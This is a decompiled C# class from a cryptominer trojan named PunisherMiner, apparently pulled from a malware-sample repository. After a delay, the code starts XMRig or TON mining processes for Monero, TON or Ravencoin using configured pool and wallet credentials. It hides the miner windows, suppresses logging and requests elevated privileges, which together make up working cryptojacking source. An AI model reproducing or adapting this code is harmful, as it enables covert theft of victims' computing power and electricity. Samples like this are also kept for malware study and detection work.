// Decompiled with JetBrains decompiler
// Type: Starter
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System;
using System.Diagnostics;
using System.Threading;

public class Starter
{
  private static Process cpu;
  private static Process gpu;

  public static void Start()
  {
    Thread.Sleep(TimeSpan.FromMinutes((double) Settings.StartDelay));
    string info = Program.GetInfo("CryptoType");
    if (!(info == "MONERO"))
    {
      if (!(info == "TON"))
      {
        if (!(info == "RAVE"))
          return;
        Starter.StartRave();
      }
      else
        Starter.StartTon();
    }
    else
      Starter.StartMonero();
  }

  private static void StartRave()
  {
    try
    {
      switch (PcInfo.Gpu)
      {
        case GpuType.Nvidia:
          string arguments1 = "--no-cpu --cuda -o " + Program.GetInfo("Pool") + " -a kawpow -u " + Program.GetInfo("Mail") + " -p " + Program.GetInfo("Password") + " --http-enabled --http-port 9999";
          Starter.gpu = Starter.StartProcess(Settings.XmrigFile, arguments1);
          break;
        case GpuType.AMD:
          string arguments2 = "--no-cpu --opencl -o " + Program.GetInfo("Pool") + " -a kawpow -u " + Program.GetInfo("Mail") + " -p " + Program.GetInfo("Password") + " --http-enabled --http-port 9999";
          Starter.gpu = Starter.StartProcess(Settings.XmrigAmdFile, arguments2);
          break;
        default:
          return;
      }
      Console.WriteLine("Gpu started, process name: " + Starter.gpu.ProcessName);
    }
    catch
    {
      Console.WriteLine("Gpu start error");
    }
  }

  private static void StartTon()
  {
    try
    {
      Starter.gpu = Starter.StartProcess(Settings.TonFile, "-w " + Program.GetInfo("Main") + " -p " + Program.GetInfo("Pool") + " -api \":8080\"");
      Console.WriteLine("Gpu started, process name: " + Starter.gpu.ProcessName);
    }
    catch
    {
      Console.WriteLine("Gpu start error");
    }
  }

  private static void StartMonero()
  {
    try
    {
      string str = "";
      if (!Settings.UseGpu)
        str = "--http-enabled --http-port 9999";
      Starter.cpu = Starter.StartProcess(Settings.XmrigFile, string.Format("-o {0} {1} -u {2} --max-cpu-usage={3} --log-file=null -p {4} --donate-level=1 --algo=cryptonight", (object) Program.GetInfo("Info"), (object) str, (object) Program.GetInfo("Mail"), (object) Settings.Intensity, (object) Program.GetInfo("Password")));
      Console.WriteLine("Cpu started, process name: " + Starter.cpu.ProcessName);
    }
    catch
    {
      Console.WriteLine("Cpu start error");
    }
    if (!Settings.UseGpu)
      return;
    try
    {
      switch (PcInfo.Gpu)
      {
        case GpuType.Nvidia:
          string arguments1 = "-a randomx -o " + Program.GetInfo("Pool") + " -u " + Program.GetInfo("Main") + " -p " + Program.GetInfo("Password") + " --donate-level=1 --cuda --http-enabled --http-port 9999";
          Starter.gpu = Starter.StartProcess(Settings.XmrigFile, arguments1);
          break;
        case GpuType.AMD:
          string arguments2 = "-a randomx -o " + Program.GetInfo("Pool") + " -u " + Program.GetInfo("Main") + " -p " + Program.GetInfo("Password") + " --donate-level=1 --opencl --http-enabled --http-port 9999";
          Starter.gpu = Starter.StartProcess(Settings.XmrigAmdFile, arguments2);
          break;
        default:
          return;
      }
      Console.WriteLine("Gpu started, process name: " + Starter.gpu.ProcessName);
    }
    catch
    {
      Console.WriteLine("Gpu start error");
    }
  }

  public static void Stop()
  {
    try
    {
      Starter.cpu.Kill();
    }
    catch
    {
    }
    try
    {
      Starter.gpu.Kill();
    }
    catch
    {
    }
  }

  public static Process StartProcess(string filename, string arguments)
  {
    if (Settings.isDebug)
      return Process.Start(new ProcessStartInfo()
      {
        FileName = filename,
        Arguments = arguments,
        Verb = "runas"
      });
    return Process.Start(new ProcessStartInfo()
    {
      FileName = filename,
      CreateNoWindow = true,
      UseShellExecute = false,
      RedirectStandardOutput = true,
      WindowStyle = ProcessWindowStyle.Hidden,
      Arguments = arguments,
      Verb = "runas"
    });
  }
}
